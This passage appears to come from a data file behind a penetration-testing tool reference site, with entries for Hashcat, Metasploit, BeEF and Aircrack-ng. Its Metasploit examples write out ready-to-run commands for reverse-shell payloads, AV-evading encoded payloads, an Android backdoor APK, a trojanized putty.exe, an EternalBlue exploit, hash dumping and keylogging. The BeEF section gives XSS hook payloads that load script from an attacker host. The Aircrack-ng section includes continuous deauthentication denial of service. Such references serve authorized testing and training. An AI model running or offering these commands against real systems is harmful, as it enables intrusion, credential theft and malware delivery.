Use --increment for variable length\\n• Hybrid Wordlist+Mask (-a 6): Wordlist followed by mask\\n  • Append brute-force to dictionary words\\n  • Example: password + ?d?d?d = password123\\n  • Efficient for known patterns\\n• Hybrid Mask+Wordlist (-a 7): Mask followed by wordlist\\n  • Prepend brute-force to dictionary words\\n  • Example: ?d?d?d + password = 123password\\n\\nGPU Acceleration:\\n• OpenCL: Cross-platform (AMD, NVIDIA, Intel)\\n• CUDA: NVIDIA-specific (often faster than OpenCL)\\n• Multi-GPU: Use -d flag to specify devices\\n• Workload Tuning: -w 1-4 (1=low, 4=nightmare)\\n• Performance: 100-1000x faster than CPU\\n• Power Usage: Monitor temps with --hwmon-temp-abort\\n• Memory: Hash tables loaded into GPU VRAM\\n\\nRule-Based Attacks:\\n• Built-in Rules: best64.rule, dive.rule, generated.rule, toggles*.rule\\n• Operations:\\n  • Append/Prepend: $1, $!, ^1, ^!\\n  • Replace: sa@ (replace a with @)\\n  • Case: u (uppercase), l (lowercase), c (capitalize)\\n  • Duplicate: d (double word)\\n  • Reverse: r\\n  • Delete: [ (first char), ] (last char)\\n• Custom Rules: Create in .rule files\\n• Multiple Rules: Stack with multiple -r flags\\n• Rule Generator: Generate rules based on patterns\\n\\nMask Attack Charsets:\\n• Built-in:\\n  • ?l = lowercase (abcdefghijklmnopqrstuvwxyz)\\n  • ?u = uppercase (ABCDEFGHIJKLMNOPQRSTUVWXYZ)\\n  • ?d = digits (0123456789)\\n  • ?s = special (!\\\"#$%&'()*+,-./:;<=>?@[\\\\]^_`{|}~)\\n  • ?a = all printable ASCII\\n  • ?b = all bytes (0x00-0xFF)\\n• Custom Charsets: -1, -2, -3, -4\\n  • Example: -1 ?l?u -2 ?d?s (charset 1 = letters, charset 2 = digits+special)\\n  • Use in mask: ?1?1?1?1?2?2\\n\\nIncrement Mode:\\n• Variable length attacks\\n• --increment: Enable increment mode\\n• --increment-min: Starting length\\n• --increment-max: Maximum length\\n• Example: Try 1-8 character passwords\\n• Significantly increases attack time\\n\\nSession Management:\\n• --session=NAME: Create named session\\n• --restore: Resume crashed/stopped session\\n• Auto-save every 10 seconds\\n• Checkpoint/restore functionality\\n• Potfile: Stores cracked hashes (.pot)\\n• Skip cracked hashes automatically\\n\\nPotfile Management:\\n• Default: hashcat.potfile\\n• Custom: --potfile-path=custom.pot\\n• Format: hash:password\\n• Automatic deduplication\\n• --show: Display cracked passwords\\n• --left: Show uncracked hashes\\n• --username: Include usernames in output\\n\\nPerformance Tuning:\\n• Workload Profiles (-w):\\n  • 1: Low (Desktop usable, slower)\\n  • 2: Default (Balanced)\\n  • 3: High (Desktop laggy)\\n  • 4: Nightmare (System unresponsive, fastest)\\n• Kernel Accel (-n): Workload size\\n• Kernel Loops (-u): Iteration count\\n• --force: Bypass warnings (use cautiously)\\n• --backend-devices: Select specific GPUs\\n\\nHash Mode Selection (-m):\\n• 0: MD5\\n• 100: SHA1\\n• 1000: NTLM\\n• 1400: SHA2-256\\n• 1700: SHA2-512\\n• 1800: Unix crypt SHA-512\\n• 3200: bcrypt\\n• 22000: WPA-PBKDF2-PMKID+EAPOL\\n• Full list: hashcat --help | grep -i 'mode'\\n\\nBenchmarking:\\n• --benchmark (-b): Test all algorithms\\n• --benchmark-all: Include slow algorithms\\n• Shows hashes/second per algorithm\\n• Use to select optimal workload\\n• Compare CPU vs GPU performance\\n\\nOutput Options:\\n• --outfile: Save cracked passwords to file\\n• --outfile-format: Custom output format\\n  • 1: hash\\n  • 2: plain\\n  • 3: hash:plain\\n  • 5: hash:plain:hex_plain\\n• --status: Display status screen\\n• --status-timer: Update interval (seconds)\\n• --quiet: Suppress output\\n• --remove: Remove cracked hashes from input\\n\\nBest Practices:\\n• Start with straight attack + rules (fastest)\\n• Use increment mode cautiously (exponential time)\\n• Monitor GPU temperature (--hwmon-temp-abort=90)\\n• Use workload profile 3 or 4 for dedicated machines\\n• Keep potfile backed up\\n• Use sessions for long-running attacks\\n• Benchmark before production use\\n• Update regularly for new hash support\\n• Use multiple GPUs for massive jobs\\n• Combine masks with knowledge (known patterns)\\n\\nCommon Pitfalls:\\n• Wrong hash mode (-m) selection\\n• Not using rules with dictionaries\\n• Increment mode on large keyspace (years to complete)\\n• Overheating GPUs without monitoring\\n• Forgetting to check potfile before restarting\\n• Using workload 4 on desktop workstation\\n• Not using session for long attacks\\n• Inefficient mask patterns\\n• Ignoring benchmark results\\n\\nIntegration:\\n• John the Ripper: Complementary CPU-focused tool\\n• Hashcat-utils: Preprocessing utilities\\n• PACK: Password analysis and cracking kit\\n• Mentalist: GUI for wordlist generation\\n• Crunch: Custom wordlist generator\\n• CeWL: Website word scraper\\n• Cain & Abel: Windows hash extraction\\n\\nReal-World Applications:\\n• Penetration Testing: Crack captured hashes\\n• Security Audits: Test password strength\\n• Forensics: Recover passwords from seized systems\\n• Red Team: Post-exploitation credential access\\n• WiFi Security: WPA/WPA2 handshake cracking\\n• Cloud Security: Test credential policies\\n• Compliance: Validate password complexity (PCI DSS, NIST)\\n• Incident Response: Analyze compromised credentials\\n\\nAdvanced Techniques:\\n• Rule Stacking: Multiple rule files for complex mutations\\n• Hybrid Attacks: Combine wordlist with masks\\n• Prince Attack: Password candidate generator\\n• Combinator Attack: Combine multiple wordlists\\n• Toggle Case: Try all case combinations\\n• Custom Charsets: Language-specific characters\\n• Markov Chains: Probability-based generation\\n• PACK Statsprocessor: Statistics-based masks\\n\\nLegal and Ethical Considerations:\\n• Only crack hashes you own or have authorization\\n• Document authorization before engagement\\n• Comply with local laws regarding security testing\\n• Follow responsible disclosure for findings\\n• Securely dispose of captured hashes after testing",
        githubUrl: "https://github.com/hashcat/hashcat",
        tags: ["password", "hash", "cracking", "GPU", "acceleration"]
      }
    ]
  },
  {
    id: "exploitation-tools",
    name: "Exploitation Tools",
    description: "Tools for exploiting vulnerabilities and gaining access to systems",
    tools: [
      {
        id: "metasploit",
        name: "Metasploit Framework",
        description: "Advanced open-source platform for developing, testing, and executing exploits",
        category: "Exploitation Tools",
        categoryId: "exploitation-tools",
        installation: "sudo apt install metasploit-framework",
        usage: "Metasploit is used for penetration testing, exploit development, and vulnerability research. It provides a comprehensive platform for finding, exploiting, and validating vulnerabilities.",
        examples: [
          {
            title: "Start Metasploit console",
            code: "msfconsole"
          },
          {
            title: "Initialize database for workspace management",
            code: "msfdb init\ndb_status\nworkspace -a project_name"
          },
          {
            title: "Search for exploits by service/platform",
            code: "search type:exploit platform:windows apache\nsearch cve:2021 type:exploit\nsearch eternalblue"
          },
          {
            title: "Use multi handler for reverse shell",
            code: "use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.100\nset LPORT 4444\nset ExitOnSession false\nexploit -j"
          },
          {
            title: "Generate Windows executable payload",
            code: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe"
          },
          {
            title: "Generate encoded payload to bypass AV",
            code: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_payload.exe"
          },
          {
            title: "Generate PHP web shell",
            code: "msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php"
          },
          {
            title: "Generate Android APK backdoor",
            code: "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o backdoor.apk"
          },
          {
            title: "Generate Linux ELF binary",
            code: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf"
          },
          {
            title: "Generate macOS Mach-O payload",
            code: "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f macho -o payload.macho"
          },
          {
            title: "Inject payload into legitimate executable",
            code: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x putty.exe -k -f exe -o trojan.exe"
          },
          {
            title: "Scan for SMB vulnerabilities (EternalBlue)",
            code: "use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS 192.168.1.0/24\nrun"
          },
          {
            title: "Exploit EternalBlue (MS17-010)",
            code: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.50\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.100\nexploit"
          },
          {
            title: "Port scanning with Nmap integration",
            code: "db_nmap -sV -O 192.168.1.0/24\nhosts\nservices"
          },
          {
            title: "Import Nmap XML results",
            code: "db_import /path/to/nmap_results.xml\nhosts -c address,os_name\nservices -p 80,443"
          },
          {
            title: "Use auxiliary scanner modules",
            code: "use auxiliary/scanner/http/http_version\nset RHOSTS 192.168.1.0/24\nset THREADS 20\nrun"
          },
          {
            title: "Post-exploitation: Dump password hashes",
            code: "use post/windows/gather/hashdump\nset SESSION 1\nrun"
          },
          {
            title: "Post-exploitation: Keylogger",
            code: "use post/windows/capture/keylog_recorder\nset SESSION 1\nrun"
          },
          {
            title: "Meterpreter: System information",
            code: "# From meterpreter session\nsysinfo\ngetuid\npwd\nls"
          },
          {
            title: "Meterpreter: Privilege escalation",
            code: "# From meterpreter session\ngetsystem\ngetprivs"
          },
          {
            title: "Meterpreter: Process migration",
            code: "# From meterpreter session\nps\nmigrate 1234"
          },
          {
            title: "Meterpreter: Screenshot and webcam",
            code: "# From meterpreter session\nscreenshot\nwebcam_snap"
          },
          {
            title: "Pivoting through compromised host",
            code: "# From meterpreter session\nrun autoroute -s 10.10.10.0/24\nbackground\nuse auxiliary/scanner/portscan/tcp\nset RHOSTS 10.10.10.0/24"
          },
          {
            title: "Resource scripts for automation",
            code: "msfconsole -r script.rc"
          }
        ],
        documentation: "The Metasploit Framework is the world's most widely used penetration testing framework. Originally created by H.D. Moore in 2003 and now maintained by Rapid7, it provides a comprehensive infrastructure for exploit development, testing, and execution. With over 2,300 exploits, 1,200 payloads, and 600 auxiliary modules, Metasploit is the industry standard for security professionals, ethical hackers, and red teams.\\n\\nCore Architecture:\\n• Exploits: Code that takes advantage of specific vulnerabilities\\n• Payloads: Code that runs after successful exploitation (shells, Meterpreter, etc.)\\n• Auxiliary: Supporting modules (scanners, fuzzers, DoS, etc.)\\n• Post-Exploitation: Modules for actions after gaining access\\n• Encoders: Obfuscate payloads to evade detection\\n• NOPs: No-operation code generators for buffer alignment\\n• Evasion: Modules designed specifically to bypass security controls\\n\\nMSFconsole - Command Center:\\n• Interactive Ruby shell (IRB) with custom commands\\n• Database integration (PostgreSQL) for workspace management\\n• Tab completion for all commands and module options\\n• Context-aware help system (help, info, show options)\\n• Resource scripts (.rc) for automation\\n• Session management for multiple compromised hosts\\n• Workspaces for organizing different engagements\\n\\nMSFvenom - Payload Generator:\\n• Unified tool replacing msfpayload and msfencode\\n• 60+ output formats (exe, elf, raw, python, powershell, etc.)\\n• 20+ encoding schemes for AV evasion\\n• Template injection into legitimate binaries (-x, -k flags)\\n• Architecture-specific payloads (x86, x64, ARM, MIPS)\\n• Platform support: Windows, Linux, macOS, Android, iOS\\n• Staged vs Stageless payloads (size vs reliability tradeoff)\\n\\nPayload Types:\\n• Singles: Self-contained, sent in one shot (e.g., shell_reverse_tcp)\\n• Stagers: Small payload that downloads larger stage (e.g., reverse_tcp)\\n• Stages: Downloaded by stager for full functionality (e.g., meterpreter)\\n• Inline: Full payload sent at once (stageless)\\n• Advantages:\\n  • Staged: Smaller initial payload, evades size-based detection\\n  • Stageless: More reliable, works in restricted networks\\n\\nMeterpreter - Advanced Payload:\\n• Reflected DLL injection (runs in memory, no disk writes)\\n• Encrypted communication channel (TLS 1.2)\\n• Extensible via scripts and modules\\n• File system operations (upload, download, edit)\\n• Process manipulation (list, kill, migrate)\\n• Network pivoting and port forwarding\\n• Privilege escalation modules\\n• Credential dumping (hashdump, mimikatz)\\n• Screenshot, keylogging, webcam capture\\n• Packet sniffing and network reconnaissance\\n• Registry manipulation (Windows)\\n• Android extensions (SMS, call logs, GPS)\\n\\nDatabase Integration:\\n• PostgreSQL backend for data persistence\\n• Workspace separation for multiple projects\\n• Import results from Nmap, Nessus, Nexpose\\n• Track hosts, services, vulnerabilities, credentials\\n• Query results with hosts, services, vulns commands\\n• Export to XML, JSON for reporting\\n• Credential management with creds command\\n\\nAuxiliary Modules:\\n• Scanners: Port, service, vulnerability detection\\n  • scanner/portscan/tcp, scanner/smb/smb_version\\n  • scanner/http/dir_scanner, scanner/ssh/ssh_login\\n• Fuzzers: Find vulnerabilities via malformed input\\n• DoS: Denial of service testing\\n• SNMP: Enumerate SNMP information\\n• VoIP: SIP, H.323 protocol testing\\n• Wireless: 802.11 attacks and analysis\\n• Password Spraying: Test common passwords across accounts\\n\\nPost-Exploitation Modules:\\n• Windows:\\n  • gather/hashdump: Extract password hashes\\n  • gather/enum_chrome: Steal Chrome credentials\\n  • manage/enable_rdp: Enable Remote Desktop\\n  • escalate/getsystem: Privilege escalation\\n• Linux:\\n  • gather/enum_configs: Enumerate configurations\\n  • gather/hashdump: Extract /etc/shadow\\n• Multi-platform:\\n  • multi/gather/ssh_creds: Steal SSH keys\\n  • multi/manage/shell_to_meterpreter: Upgrade shell\\n\\nEvasion Techniques:\\n• Encoders: shikata_ga_nai (polymorphic), call4_dword_xor\\n• Multiple encoding iterations (-i flag)\\n• Custom templates to embed in trusted executables\\n• Process migration to trusted processes\\n• In-memory execution (Meterpreter, PowerShell payloads)\\n• Transport switching (HTTP, HTTPS, DNS)\\n• Sleep obfuscation and jitter\\n• Anti-forensics (timestomp, clearev)\\n\\nPivoting and Lateral Movement:\\n• autoroute: Route traffic through compromised host\\n• portfwd: Forward ports through session\\n• socks_proxy: Create SOCKS proxy via session\\n• Proxychains integration for tool routing\\n• Multi-hop pivoting through multiple compromised hosts\\n• Cross-subnet exploitation\\n\\nAutomation and Scripting:\\n• Resource Scripts (.rc): Batch commands\\n• Meterpreter Scripts: Ruby scripts for custom actions\\n• Post modules: Reusable Ruby modules\\n• RPC API: Remote control via MSGPACK\\n• REST API: Web-based integration\\n• Custom modules: Ruby classes in modules directory\\n\\nIntegration Capabilities:\\n• Cobalt Strike: Beacon integration\\n• Empire/Covenant: C2 framework interop\\n• Burp Suite: Web app testing integration\\n• Armitage: GUI for team collaboration\\n• Metasploit Pro: Commercial features (reporting, campaigns)\\n• SIEM Integration: Export events to Splunk, etc.\\n\\nBest Practices:\\n• Always use workspaces for project separation\\n• Set global options with setg for efficiency\\n• Use database to track all reconnaissance data\\n• Test exploits in lab before production use\\n• Understand reliability and side effects (info command)\\n• Check target compatibility (platform, architecture)\\n• Use AutoRunScript for automatic post-exploitation\\n• Migrate Meterpreter to stable process immediately\\n• Use HTTPS transport for encrypted C2\\n• Clean up artifacts with clearev, timestomp\\n• Document all actions for reporting\\n• Keep framework updated (msfupdate)\\n\\nCommon Workflows:\\n• Reconnaissance: db_nmap, auxiliary scanners\\n• Vulnerability Identification: search, vulns command\\n• Exploitation: use exploit, set options, check, exploit\\n• Post-Exploitation: migrate, hashdump, gather modules\\n• Pivoting: autoroute, portfwd, additional exploitation\\n• Persistence: persistence modules, scheduled tasks\\n• Cleanup: clearev, remove backdoors, timestamps\\n• Reporting: Export database, generate reports\\n\\nReal-World Applications:\\n• Penetration Testing: Authorized security assessments\\n• Red Team Operations: Simulate APT attack campaigns\\n• Vulnerability Research: Test and develop exploits\\n• Security Training: Hands-on exploitation practice\\n• Compliance: Validate security controls (PCI DSS)\\n• Incident Response: Recreate attacker techniques\\n• Bug Bounty: Validate and prove exploitability\\n• CTF Competitions: Challenge solving and scoring\\n\\nCommon Pitfalls:\\n• Crashing target systems with unreliable exploits\\n• Getting caught by IDS/IPS with default payloads\\n• Losing sessions due to unstable payloads\\n• Not migrating Meterpreter causing session loss\\n• Forgetting to background sessions\\n• Using wrong payload architecture (x86 vs x64)\\n• Not checking target requirements before exploitation\\n• Triggering EDR with well-known payloads\\n• Leaving artifacts and forensic evidence",
        githubUrl: "https://github.com/rapid7/metasploit-framework",
        tags: ["exploitation", "penetration testing", "framework", "vulnerability", "payload"],
        additionalInfo: "Metasploit was originally created by H. D. Moore in 2003 and is now owned by Rapid7. It's available in both commercial (Metasploit Pro) and free (Metasploit Framework) versions. The framework is built into most penetration testing distributions and is considered a standard tool for security professionals."
      },
      {
        id: "beef",
        name: "BeEF (Browser Exploitation Framework)",
        description: "Tool focusing on leveraging browser vulnerabilities to assess the security posture of a target",
        category: "Exploitation Tools",
        categoryId: "exploitation-tools",
        installation: "sudo apt install beef-xss",
        usage: "BeEF is used to assess a target's security by focusing on the web browser attack vector",
        examples: [
          {
            title: "Start BeEF server",
            code: "sudo beef-xss"
          },
          {
            title: "Access control panel",
            code: "http://127.0.0.1:3000/ui/panel"
          },
          {
            title: "Basic hook script (inject in target page)",
            code: "<script src=\"http://attacker-ip:3000/hook.js\"></script>"
          },
          {
            title: "Stealth hook (minimal code)",
            code: "<script src=\"http://bit.ly/shortened-hook\"></script>"
          },
          {
            title: "Hook via XSS payload",
            code: "\"><script src=http://attackerip:3000/hook.js></script>"
          },
          {
            title: "Start with custom config",
            code: "beef-xss -c /path/to/config.yaml"
          },
          {
            title: "Import third-party extensions",
            code: "# Place extensions in ~/.beef/extensions/"
          },
          {
            title: "Use RESTful API",
            code: "curl -H 'Content-Type: application/json' -d '{\"username\":\"beef\",\"password\":\"beef\"}' http://127.0.0.1:3000/api/admin/login"
          },
          {
            title: "Enable metasploit integration",
            code: "# Set metasploit: {enable: true} in config.yaml"
          },
          {
            title: "Command execution via API",
            code: "curl -H 'Content-Type: application/json' -X POST -d '{\"command\":\"alert\",\"params\":{\"text\":\"Hooked!\"}}' http://127.0.0.1:3000/api/hooks/[session]/execute"
          }
        ],
        documentation: "BeEF (Browser Exploitation Framework) is a powerful penetration testing tool that focuses on exploiting web browser vulnerabilities. Developed by Wade Alcorn and maintained by the BeEF Project, it demonstrates the impact of browser-based attacks and allows security professionals to assess client-side security posture.\\n\\nCore Concepts:\\n• Hook: JavaScript injected into target browser\\n• Hooked Browser: Victim browser running BeEF hook\\n• Zombie: Compromised browser under attacker control\\n• Command Modules: Attack payloads executed on zombies\\n• Web GUI: Control panel for managing attacks\\n• RESTful API: Programmatic control\\n\\nArchitecture:\\n• Communication Server: Manages hooked browsers\\n• Web Interface: User-friendly control panel (port 3000)\\n• Hook Handler: JavaScript communications\\n• Command Modules: 300+ attack modules\\n• Extension System: Custom functionality\\n• Database: SQLite for session storage\\n• API: RESTful endpoints for automation\\n\\nHooking Methods:\\n• Reflected XSS: Inject hook via vulnerable parameter\\n• Stored XSS: Persistent hook in database\\n• DOM XSS: Client-side injection\\n• MITM: Inject hook via network interception\\n• Social Engineering: Trick user to visit page\\n• Physical Access: Modify local files\\n• Content Injection: Ads, widgets, comments\\n• DNS Hijacking: Redirect to hooked page\\n\\nCommand Modules (Categories):\\n• Browser:\\n  • Hooked Domain: Information gathering\\n  • Webcam: Capture photos\\n  • Geolocation: Get physical location\\n  • Detect Software: Installed plugins\\n• Chrome Extensions:\\n  • Hijack Gmail sessions\\n  • Steal credentials\\n  • Monitor activity\\n• Exploits:\\n  • Browser exploits (CVEs)\\n  • Plugin vulnerabilities\\n  • ActiveX attacks\\n• Host:\\n  • Detect OS, architecture\\n  • Local network scanning\\n  • Port scanning\\n• Network:\\n  • Fingerprint services\\n  • DNS enumeration\\n  • Cross-protocol attacks\\n• Persistence:\\n  • Confirm close popup\\n  • Man-in-the-browser\\n  • iFrame persistence\\n• Phonegap:\\n  • Mobile app attacks\\n  • Device information\\n• Social Engineering:\\n  • Fake notification bar\\n  • Clipboard theft\\n  • Pretty Theft (credential harvesting)\\n  • TabNabbing\\n\\nModule Status Indicators:\\n• Green: Module works on target\\n• Orange: May work, user interaction needed\\n• Grey: Won't work on target\\n• Red: Module failed\\n\\nCommand Module Examples:\\n• Get Clipboard: Steal copied content\\n• Pretty Theft: Fake login prompts\\n• Webcam: Capture images via getUserMedia\\n• Geolocation: HTML5 geolocation API\\n• Browser Fingerprint: Detailed browser info\\n• Network Discovery: Scan internal network\\n• Port Scanner: Identify open ports\\n• Social Engineering: Fake update prompts\\n• Raw JavaScript: Custom code execution\\n\\nMetasploit Integration:\\n• Proxy Pivot: Route Metasploit through BeEF\\n• Browser Autopwn: Automated exploitation\\n• Payload Delivery: Serve exploits to hooked browsers\\n• Cross-Framework: Combine web + network attacks\\n• Configuration: Enable in config.yaml\\n• Handlers: Automatic exploit serving\\n\\nRESTful API:\\n• Authentication: Token-based\\n• Endpoints:\\n  • /api/admin/login: Authentication\\n  • /api/hooks: List hooked browsers\\n  • /api/hooks/[session]: Session details\\n  • /api/modules: Available modules\\n  • /api/hooks/[session]/execute: Run commands\\n• Automation: Scripted attacks\\n• Integration: SIEM, custom tools\\n\\nPersistence Techniques:\\n• Popup on Close: Warn user before leaving\\n• iFrame Embedding: Hidden persistent frame\\n• Man-in-the-Browser: Intercept all requests\\n• Service Worker: Background JavaScript\\n• WebRTC Persistence: Maintain connection\\n• Confirm Navigation: Block page leave\\n\\nInformation Gathering:\\n• Browser Details: Type, version, plugins\\n• Operating System: Platform detection\\n• Network Info: Internal IP, hostname\\n• Location: GPS coordinates\\n• Screen Resolution: Display info\\n• Cookies: Session tokens\\n• Browser History: Visited sites\\n• Social Media: Detect logged-in accounts\\n\\nSocial Engineering Modules:\\n• Pretty Theft: Fake login boxes (Facebook, Gmail, etc.)\\n• TabNabbing: Change inactive tabs\\n• Clipboard Hijack: Steal/modify clipboard\\n• Fake Flash Update: Malware download prompts\\n• Notification Bar: Fake browser notifications\\n• Fake Plugin Update: Trick user installs\\n\\nAdvanced Attacks:\\n• Cross-Protocol Attacks: HTTP to internal services\\n• DNS Rebinding: Bypass same-origin policy\\n• CORS Exploitation: Cross-origin requests\\n• WebRTC Leaks: Reveal real IP\\n• Browser Autopwn: Automated exploitation\\n• Tunneling: Proxy through hooked browser\\n• Inter-Protocol Exploitation: Attack protocols via browser\\n\\nConfiguration (config.yaml):\\n• Server Settings: IP, ports, SSL\\n• Authentication: Change default credentials\\n• Extension Enable/Disable: Module control\\n• Database: SQLite path\\n• Autorun: Modules on hook\\n• Console Logs: Logging level\\n• Web Server: Custom web root\\n\\nWeb Interface Features:\\n• Dashboard: Overview of hooked browsers\\n• Online Browsers: Real-time zombie list\\n• Module Execution: Run commands\\n• Command Results: View output\\n• Logs: Activity tracking\\n• Event Notifications: Real-time alerts\\n• Browser Details: Detailed information\\n• Multi-Select: Command multiple zombies\\n\\nExtensions:\\n• Custom Modules: Add new functionality\\n• Third-Party: Community extensions\\n• Location: ~/.beef/extensions/\\n• Development: Ruby/JavaScript\\n• API Integration: External service hooks\\n\\nDefense Against BeEF:\\n• Content Security Policy (CSP): Restrict script sources\\n• X-Frame-Options: Prevent iframe embedding\\n• Input Validation: Prevent XSS\\n• HTTPOnly Cookies: Protect session tokens\\n• Subresource Integrity: Verify script integrity\\n• HTTPS Only: Prevent MITM injection\\n• Security Headers: HSTS, X-Content-Type\\n• Browser Extensions: NoScript, uBlock Origin\\n\\nBest Practices:\\n• Authorization: Only test authorized applications\\n• Lab Environment: Practice safely\\n• Change Defaults: Update default credentials\\n• HTTPS: Use SSL for hook delivery\\n• Obfuscation: Hide hook.js URL\\n• Target Reconnaissance: Know target first\\n• Module Selection: Choose appropriate attacks\\n• Document Findings: Record all activities\\n• Clean Up: Remove hooks after testing\\n\\nLimitations:\\n• Requires XSS: Need injection point\\n• Same-Origin: Limited by browser policy\\n• Browser Compatibility: Some modules browser-specific\\n• Active Connection: Needs persistent connection\\n• Detection: Network monitoring can spot it\\n• Modern Browsers: Security features limit attacks\\n\\nReal-World Applications:\\n• Penetration Testing: Demonstrate XSS impact\\n• Security Awareness: Training demonstrations\\n• Red Team: Client-side attack simulation\\n• Vulnerability Assessment: Test browser security\\n• Research: Browser security research\\n• CTF: Capture the Flag challenges\\n• Bug Bounty: Prove XSS exploitability\\n\\nIntegration:\\n• Metasploit: Browser exploitation integration\\n• Social Engineer Toolkit: Phishing campaigns\\n• Burp Suite: Find and exploit XSS\\n• OWASP ZAP: Identify injection points\\n• Custom Scripts: API automation\\n• SIEM: Log analysis and correlation\\n\\nCommon Use Cases:\\n• XSS Impact Demo: Show what attackers can do\\n• Internal Network Mapping: From hooked browser\\n• Credential Harvesting: Social engineering\\n• Session Hijacking: Steal authentication tokens\\n• Phishing: Combined attacks\\n• Malware Delivery: Drive-by downloads\\n• Browser Fingerprinting: Identify users\\n\\nLegal and Ethical:\\n• Authorization: Written permission required\\n• Scope: Stay within authorized targets\\n• No Malicious Use: Educational/testing only\\n• Data Protection: Handle captured data securely\\n• Compliance: Follow laws (CFAA, GDPR)\\n• Responsible Disclosure: Report findings properly\\n• Impact: Minimize disruption",
        githubUrl: "https://github.com/beefproject/beef",
        tags: ["browser", "exploitation", "XSS", "client-side", "hook"]
      }
    ]
  },
  {
    id: "wireless-attacks",
    name: "Wireless Attacks",
    description: "Tools for analyzing and attacking wireless networks and protocols",
    tools: [
      {
        id: "aircrack-ng",
        name: "Aircrack-ng",
        description: "Complete suite of tools to assess WiFi network security",
        category: "Wireless Attacks",
        categoryId: "wireless-attacks",
        installation: "sudo apt install aircrack-ng",
        usage: "Aircrack-ng is used to monitor, attack, test, and crack WiFi networks. It includes tools for packet capture, WEP/WPA key cracking, and analysis.",
        examples: [
          {
            title: "Check wireless card compatibility",
            code: "airmon-ng"
          },
          {
            title: "Enable monitor mode",
            code: "airmon-ng start wlan0"
          },
          {
            title: "Kill interfering processes",
            code: "airmon-ng check kill"
          },
          {
            title: "Discover all nearby networks",
            code: "airodump-ng wlan0mon"
          },
          {
            title: "Targeted capture on specific channel",
            code: "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon"
          },
          {
            title: "Capture on 5GHz band",
            code: "airodump-ng --band a wlan0mon"
          },
          {
            title: "Capture with filtering",
            code: "airodump-ng -c 1-14 --band bg -w capture wlan0mon"
          },
          {
            title: "Deauthentication attack (capture handshake)",
            code: "aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon"
          },
          {
            title: "Continuous deauth (denial of service)",
            code: "aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon"
          },
          {
            title: "Fake authentication attack",
            code: "aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon"
          },
          {
            title: "ARP replay attack (WEP)",
            code: "aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon"
          },
          {
            title: "Crack WPA/WPA2 with wordlist",
            code: "aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap"
          },
          {
            title: "Crack WEP key",
            code: "aircrack-ng -b AA:BB:CC:DD:EE:FF capture*.cap"
          },
          {
            title: "Crack with BSSID and ESSID",
            code: "aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF -e \"NetworkName\" capture-01.cap"
          },
          {
            title: "Convert capture to hashcat format",
            code: "aircrack-ng capture-01.cap -J hashcat_file"
          },
          {
            title: "Test injection capability",
            code: "aireplay-ng -9 wlan0mon"
          },
          {
            title: "Create virtual interface",
            code: "iw phy phy0 interface add wlan0mon type monitor"
          },
          {
            title: "Disable monitor mode",
            code: "airmon-ng stop wlan0mon"
          }
        ],
        documentation: "Aircrack-ng is the most widely used wireless network security assessment suite, originally forked from the original Aircrack in 2006. It's a complete toolkit for wireless auditing: monitoring, attacking, testing, and cracking WiFi networks. Supports 802.11a/b/g/n/ac/ax standards and works with any wireless card supporting raw monitoring mode.\n\nSuite Components:\n• airmon-ng: Enable/disable monitor mode on wireless interfaces\n• airodump-ng: Packet capture and network discovery\n• aireplay-ng: Packet injection and attack tool\n• aircrack-ng: WEP/WPA/WPA2 key cracking\n• airdecap-ng: Decrypt WEP/WPA captures\n• airbase-ng: Create fake access points\n• airdecloak-ng: Remove WEP cloaking\n• airolib-ng: Manage password databases\n• packetforge-ng: Create encrypted packets\n• ivstools: Merge/convert IVS files\n• easside-ng: Auto WEP cracking\n• tkiptun-ng: WPA/TKIP attacks\n• wesside-ng: Automatic WEP key recovery\n\nMonitor Mode (airmon-ng):\n• Enable: airmon-ng start wlan0\n• Check Compatibility: airmon-ng (shows adapters)\n• Kill Processes: airmon-ng check kill\n• Disable: airmon-ng stop wlan0mon\n• Channel Hopping: Default behavior in monitor mode\n• Fixed Channel: Set with airodump-ng -c N\n• Requirements: Compatible wireless card and driver\n\nCompatible Wireless Cards:\n• Atheros: AR9271, AR5B95, AR9285 (best)\n• Ralink: RT3070, RT3572, RT5370\n• Realtek: RTL8812AU, RTL8814AU (with modified drivers)\n• Intel: Limited support, usually no injection\n• Recommended: Alfa AWUS036ACH, AWUS036NHA\n• External: USB adapters often better than internal\n\nNetwork Discovery (airodump-ng):\n• Basic: airodump-ng wlan0mon\n• Channel: -c N (specific channel) or -c 1-14 (range)\n• Band: --band abg (2.4GHz+5GHz)\n• BSSID Filter: --bssid AA:BB:CC:DD:EE:FF\n• Output: -w filename (creates .cap, .csv, .log files)\n• Update Speed: --update N (seconds)\n• Manufacturer: --manufacturer (show OUI)\n• WPS Info: --wps (detect WPS-enabled APs)\n\nDisplay Information:\n• BSSID: Access point MAC address\n• PWR: Signal strength (closer = higher)\n• Beacons: Beacon frames received\n• Data: Data packets captured\n• CH: Channel number\n• MB: Maximum speed\n• ENC: Encryption (OPN, WEP, WPA, WPA2, WPA3)\n• CIPHER: CCMP, TKIP, WEP\n• AUTH: PSK, MGT (enterprise)\n• ESSID: Network name\n\nPacket Injection (aireplay-ng):\n• Test Injection: -9 